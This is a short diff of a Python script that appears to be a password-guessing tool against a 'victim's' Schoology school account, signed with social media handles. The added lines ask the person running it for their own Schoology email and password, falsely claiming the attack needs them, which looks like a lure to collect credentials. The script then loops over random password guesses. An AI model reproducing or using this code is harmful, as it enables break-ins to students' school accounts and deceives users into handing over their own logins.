@@ -17,9 +17,13 @@ print('''
                tiktok jahsehrare
                insta: spookyle4n
 ''')
-c = input("[?] victims school email? (ex. jappleseed26@klschools.org): ")
-b = int(input("[?] How many passwords would you like to generate?: "))
-a = input("[?] Generate wordlist? [y/n]: ")
+e = input("[?] Your schoology email?: ")
+d = input("[?] Your schoology password? (bruteforce attack wont work without it): ")
+print("attempting to login with...\033[1;3m " + e + " " + d)
+time.sleep(3)
+c = input("[?] Victims schoology email?: ")
+b = int(input("[?] How many passwords would you like to try?: "))
+a = input("[?] Start Attack? [y/n]: ")
 if a == 'y':
     for i in range(b):
         randomnumber = chr(random.randint(ord('0'), ord('9')))
